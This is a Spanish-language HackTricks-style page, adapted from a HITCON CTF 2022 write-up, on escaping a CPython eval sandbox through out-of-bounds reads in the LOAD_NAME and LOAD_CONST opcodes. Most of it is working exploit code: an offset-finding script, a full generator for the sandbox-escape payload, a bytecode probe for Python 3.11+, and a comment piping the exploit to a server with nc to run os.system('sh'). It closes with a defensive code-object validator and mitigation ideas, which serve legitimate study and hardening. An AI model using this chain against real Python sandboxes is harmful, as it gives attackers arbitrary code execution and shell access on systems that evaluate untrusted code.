# Lectura OOB del opcode LOAD_NAME / LOAD_CONST

{{#include ../../../banners/hacktricks-training.md}}

**Esta información fue tomada** [**de este writeup**](https://blog.splitline.tw/hitcon-ctf-2022/)**.**<sup>[[1]](#references)</sup>

### TL;DR <a href="#tldr-2" id="tldr-2"></a>

Podemos usar la función de lectura OOB en el opcode LOAD_NAME / LOAD_CONST para obtener algún símbolo de la memoria. Esto significa usar un truco como `(a, b, c, ... hundreds of symbol ..., __getattribute__) if [] else [].__getattribute__(...)` para obtener el símbolo que quieras (como el nombre de una función).

Después, solo hay que crear el exploit.

### Descripción general <a href="#overview-1" id="overview-1"></a>

El código fuente es bastante corto: ¡solo contiene 4 líneas!
```python
source = input('>>> ')
if len(source) > 13337: exit(print(f"{'L':O<13337}NG"))
code = compile(source, '∅', 'eval').replace(co_consts=(), co_names=())
print(eval(code, {'__builtins__': {}}))1234
```
Puedes introducir código Python arbitrario, que se compilará en un [Python code object](https://docs.python.org/3/c-api/code.html). Sin embargo, `co_consts` y `co_names` de ese code object se reemplazarán por una tupla vacía antes de hacer eval de dicho code object.

Por lo tanto, cualquier expresión que contenga consts (por ejemplo, números, strings, etc.) o names (por ejemplo, variables, funciones) podría causar finalmente un segmentation fault.

### Out of Bound Read <a href="#out-of-bound-read" id="out-of-bound-read"></a>

¿Cómo ocurre el segfault?

Comencemos con un ejemplo sencillo: `[a, b, c]` podría compilarse en el siguiente bytecode.
```
1           0 LOAD_NAME                0 (a)
2 LOAD_NAME                1 (b)
4 LOAD_NAME                2 (c)
6 BUILD_LIST               3
8 RETURN_VALUE12345
```
Pero ¿qué ocurre si `co_names` se convierte en una tupla vacía? El opcode `LOAD_NAME 2` todavía se ejecuta e intenta leer un valor de la dirección de memoria que le correspondería originalmente. Sí, esto es una "feature" de lectura OOB.

El concepto principal de la solución es sencillo. Algunos opcodes de CPython, como `LOAD_NAME` y `LOAD_CONST`, son vulnerables (?) a lecturas OOB.

Recuperan un objeto del índice `oparg` de la tupla `consts` o `names` (que internamente reciben los nombres `co_consts` y `co_names`). Podemos consultar el siguiente fragmento breve sobre `LOAD_CONST` para ver qué hace CPython cuando procesa el opcode `LOAD_CONST`.
```c
case TARGET(LOAD_CONST): {
PREDICTED(LOAD_CONST);
PyObject *value = GETITEM(consts, oparg);
Py_INCREF(value);
PUSH(value);
FAST_DISPATCH();
}1234567
```
De esta manera podemos usar la funcionalidad OOB para obtener un `"name"` desde un offset de memoria arbitrario. Para asegurarte de qué nombre tiene y cuál es su offset, sigue probando `LOAD_NAME 0`, `LOAD_NAME 1` ... `LOAD_NAME 99` ... Y podrías encontrar algo con un oparg > 700. También puedes intentar usar `gdb` para echar un vistazo al layout de memoria, por supuesto, pero no creo que sea más fácil.

### Generando el Exploit <a href="#generating-the-exploit" id="generating-the-exploit"></a>

Una vez que recuperemos esos offsets útiles para names / consts, ¿cómo _obtenemos_ un name / const desde ese offset y lo usamos? Aquí tienes un truco:\
Supongamos que podemos obtener un name `__getattribute__` desde el offset 5 (`LOAD_NAME 5`) con `co_names=()`, entonces simplemente hacemos lo siguiente:
```python
[a,b,c,d,e,__getattribute__] if [] else [
[].__getattribute__
# you can get the __getattribute__ method of list object now!
]1234
```
> Ten en cuenta que no es necesario nombrarlo como `__getattribute__`; puedes llamarlo de forma más corta o más extraña.

Puedes entender el motivo simplemente viendo su bytecode:
```python
0 BUILD_LIST               0
2 POP_JUMP_IF_FALSE       20
>>    4 LOAD_NAME                0 (a)
>>    6 LOAD_NAME                1 (b)
>>    8 LOAD_NAME                2 (c)
>>   10 LOAD_NAME                3 (d)
>>   12 LOAD_NAME                4 (e)
>>   14 LOAD_NAME                5 (__getattribute__)
16 BUILD_LIST               6
18 RETURN_VALUE
20 BUILD_LIST               0
>>   22 LOAD_ATTR                5 (__getattribute__)
24 BUILD_LIST               1
26 RETURN_VALUE1234567891011121314
```
Observa que `LOAD_ATTR` también recupera el nombre de `co_names`. Python carga los nombres desde el mismo offset si el nombre es el mismo, por lo que el segundo `__getattribute__` todavía se carga desde offset=5. Usando esta característica, podemos usar cualquier nombre una vez que el nombre se encuentre en la memoria cercana.

Para generar números debería ser trivial:

- 0: not \[\[]]
- 1: not \[]
- 2: (not \[]) + (not \[])
- ...

### Exploit Script <a href="#exploit-script-1" id="exploit-script-1"></a>

No utilicé consts debido al límite de longitud.

Primero, este es un script para encontrar esos offsets de los nombres.
```python
from types import CodeType
from opcode import opmap
from sys import argv


class MockBuiltins(dict):
def __getitem__(self, k):
if type(k) == str:
return k


if __name__ == '__main__':
n = int(argv[1])

code = [
*([opmap['EXTENDED_ARG'], n // 256]
if n // 256 != 0 else []),
opmap['LOAD_NAME'], n % 256,
opmap['RETURN_VALUE'], 0
]

c = CodeType(
0, 0, 0, 0, 0, 0,
bytes(code),
(), (), (), '<sandbox>', '<eval>', 0, b'', ()
)

ret = eval(c, {'__builtins__': MockBuiltins()})
if ret:
print(f'{n}: {ret}')

# for i in $(seq 0 10000); do python find.py $i ; done1234567891011121314151617181920212223242526272829303132
```
Y lo siguiente sirve para generar el exploit real en Python.
```python
import sys
import unicodedata


class Generator:
# get numner
def __call__(self, num):
if num == 0:
return '(not[[]])'
return '(' + ('(not[])+' * num)[:-1] + ')'

# get string
def __getattribute__(self, name):
try:
offset = None.__dir__().index(name)
return f'keys[{self(offset)}]'
except ValueError:
offset = None.__class__.__dir__(None.__class__).index(name)
return f'keys2[{self(offset)}]'


_ = Generator()

names = []
chr_code = 0
for x in range(4700):
while True:
chr_code += 1
char = unicodedata.normalize('NFKC', chr(chr_code))
if char.isidentifier() and char not in names:
names.append(char)
break

offsets = {
"__delitem__": 2800,
"__getattribute__": 2850,
'__dir__': 4693,
'__repr__': 2128,
}

variables = ('keys', 'keys2', 'None_', 'NoneType',
'm_repr', 'globals', 'builtins',)

for name, offset in offsets.items():
names[offset] = name

for i, var in enumerate(variables):
assert var not in offsets
names[792 + i] = var


source = f'''[
({",".join(names)}) if [] else [],
None_ := [[]].__delitem__({_(0)}),
keys := None_.__dir__(),
NoneType := None_.__getattribute__({_.__class__}),
keys2 := NoneType.__dir__(NoneType),
get := NoneType.__getattribute__,
m_repr := get(
get(get([],{_.__class__}),{_.__base__}),
{_.__subclasses__}
)()[-{_(2)}].__repr__,
globals := get(m_repr, m_repr.__dir__()[{_(6)}]),
builtins := globals[[*globals][{_(7)}]],
builtins[[*builtins][{_(19)}]](
builtins[[*builtins][{_(28)}]](), builtins
)
]'''.strip().replace('\n', '').replace(' ', '')

print(f"{len(source) = }", file=sys.stderr)
print(source)

# (python exp.py; echo '__import__("os").system("sh")'; cat -) | nc challenge.server port
12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273
```
Básicamente, hace lo siguiente; para esas cadenas, las obtenemos del método `__dir__`:
```python
getattr = (None).__getattribute__('__class__').__getattribute__
builtins = getattr(
getattr(
getattr(
[].__getattribute__('__class__'),
'__base__'),
'__subclasses__'
)()[-2],
'__repr__').__getattribute__('__globals__')['builtins']
builtins['eval'](builtins['input']())
```
---

### Notas de versión y opcodes afectados (Python 3.11–3.13)

- Los opcodes del bytecode de CPython siguen indexando las tuplas `co_consts` y `co_names` mediante operandos enteros. Si un atacante puede forzar que estas tuplas estén vacías (o sean más pequeñas que el índice máximo utilizado por el bytecode), el intérprete leerá memoria fuera de límites para ese índice, obteniendo un puntero PyObject arbitrario de la memoria cercana. Los opcodes relevantes incluyen al menos:
- `LOAD_CONST consti` → lee `co_consts[consti]`.
- `LOAD_NAME namei`, `STORE_NAME`, `DELETE_NAME`, `LOAD_GLOBAL`, `STORE_GLOBAL`, `IMPORT_NAME`, `IMPORT_FROM`, `LOAD_ATTR`, `STORE_ATTR` → leen nombres de `co_names[...]` (para 3.11+, ten en cuenta que `LOAD_ATTR`/`LOAD_GLOBAL` almacenan bits de flags en el bit bajo; el índice real es `namei >> 1`). Consulta la documentación del desensamblador para conocer la semántica exacta de cada versión. [Python dis docs].<sup>[[2]](#references)</sup>
- Python 3.11+ introdujo cachés adaptativas/inline que añaden entradas `CACHE` ocultas entre las instrucciones. Esto no cambia la primitiva OOB; solo significa que, si construyes bytecode manualmente, debes tener en cuenta esas entradas de caché al crear `co_code`.

Implicación práctica: la técnica de esta página sigue funcionando en CPython 3.11, 3.12 y 3.13 cuando puedes controlar un objeto de código (por ejemplo, mediante `CodeType.replace(...)`) y reducir `co_consts`/`co_names`.

### Escáner rápido de índices OOB útiles (compatible con 3.11+/3.12+)

Si prefieres buscar objetos interesantes directamente desde el bytecode en lugar de hacerlo desde código fuente de alto nivel, puedes generar objetos de código mínimos y probar índices mediante fuerza bruta. El helper siguiente inserta automáticamente las cachés inline cuando es necesario.
```python
import dis, types

def assemble(ops):
# ops: list of (opname, arg) pairs
cache = bytes([dis.opmap.get("CACHE", 0), 0])
out = bytearray()
for op, arg in ops:
opc = dis.opmap[op]
out += bytes([opc, arg])
# Python >=3.11 inserts per-opcode inline cache entries
ncache = getattr(dis, "_inline_cache_entries", {}).get(opc, 0)
out += cache * ncache
return bytes(out)

# Reuse an existing function's code layout to simplify CodeType construction
base = (lambda: None).__code__

# Example: probe co_consts[i] with LOAD_CONST i and return it
# co_consts/co_names are intentionally empty so LOAD_* goes OOB

def probe_const(i):
code = assemble([
("RESUME", 0),          # 3.11+
("LOAD_CONST", i),
("RETURN_VALUE", 0),
])
c = base.replace(co_code=code, co_consts=(), co_names=())
try:
return eval(c)
except Exception:
return None

for idx in range(0, 300):
obj = probe_const(idx)
if obj is not None:
print(idx, type(obj), repr(obj)[:80])
```
Notas
- Para sondear nombres en su lugar, cambia `LOAD_CONST` por `LOAD_NAME`/`LOAD_GLOBAL`/`LOAD_ATTR` y ajusta el uso de la pila según corresponda.
- Usa `EXTENDED_ARG` o varios bytes de `arg` para alcanzar índices >255 si es necesario. Al construirlo con `dis` como se muestra arriba, solo controlas el byte bajo; para índices mayores, construye los bytes sin procesar tú mismo o divide el ataque entre varias cargas.

### Patrón mínimo de RCE usando únicamente bytecode (co_consts OOB → builtins → eval/input)

Una vez que hayas identificado un índice de `co_consts` que resuelva al módulo builtins, puedes reconstruir `eval(input())` sin ningún `co_names` manipulando la pila:
```python
# Build co_code that:
# 1) LOAD_CONST <builtins_idx> → push builtins module
# 2) Use stack shuffles and BUILD_TUPLE/UNPACK_EX to peel strings like 'input'/'eval'
#    out of objects living nearby in memory (e.g., from method tables),
# 3) BINARY_SUBSCR to do builtins["input"] / builtins["eval"], CALL each, and RETURN_VALUE
# This pattern is the same idea as the high-level exploit above, but expressed in raw bytecode.
```
Este enfoque es útil en challenges que te dan control directo sobre `co_code` y fuerzan `co_consts=()` y `co_names=()` (por ejemplo, “awpcode” de BCTF 2024). Evita los trucos a nivel de código fuente y mantiene pequeño el tamaño del payload aprovechando las operaciones de stack del bytecode y los constructores de tuplas.

### Comprobaciones defensivas y mitigaciones para sandboxes

Si estás escribiendo un “sandbox” de Python que compila/evalúa código no confiable o manipula objetos de código, no dependas de que CPython compruebe los límites de los índices de tuplas utilizados por el bytecode. En su lugar, valida los objetos de código por tu cuenta antes de ejecutarlos.

Validador práctico (rechaza el acceso OOB a co_consts/co_names)
```python
import dis

def max_name_index(code):
max_idx = -1
for ins in dis.get_instructions(code):
if ins.opname in {"LOAD_NAME","STORE_NAME","DELETE_NAME","IMPORT_NAME",
"IMPORT_FROM","STORE_ATTR","LOAD_ATTR","LOAD_GLOBAL","DELETE_GLOBAL"}:
namei = ins.arg or 0
# 3.11+: LOAD_ATTR/LOAD_GLOBAL encode flags in the low bit
if ins.opname in {"LOAD_ATTR","LOAD_GLOBAL"}:
namei >>= 1
max_idx = max(max_idx, namei)
return max_idx

def max_const_index(code):
return max([ins.arg for ins in dis.get_instructions(code)
if ins.opname == "LOAD_CONST"] + [-1])

def validate_code_object(code: type((lambda:0).__code__)):
if max_const_index(code) >= len(code.co_consts):
raise ValueError("Bytecode refers to const index beyond co_consts length")
if max_name_index(code) >= len(code.co_names):
raise ValueError("Bytecode refers to name index beyond co_names length")

# Example use in a sandbox:
# src = input(); c = compile(src, '<sandbox>', 'exec')
# c = c.replace(co_consts=(), co_names=())       # if you really need this, validate first
# validate_code_object(c)
# eval(c, {'__builtins__': {}})
```
Ideas adicionales de mitigación
- No permitas `CodeType.replace(...)` arbitrario sobre entradas no confiables, o añade comprobaciones estructurales estrictas sobre el objeto de código resultante.
- Considera ejecutar el código no confiable en un proceso separado con sandboxing a nivel del sistema operativo (seccomp, job objects, containers) en lugar de depender de la semántica de CPython.

## Referencias

- [1] [Writeup de Splitline sobre HITCON CTF 2022 "V O I D" (origen de esta técnica y cadena de exploit de alto nivel)](https://blog.splitline.tw/hitcon-ctf-2022/)
- [2] [Documentación del desensamblador de Python (semántica de los índices para LOAD_CONST/LOAD_NAME/etc., y los indicadores de bit bajo de `LOAD_ATTR`/`LOAD_GLOBAL` en 3.11+)](https://docs.python.org/3.13/library/dis.html)

{{#include ../../../banners/hacktricks-training.md}}
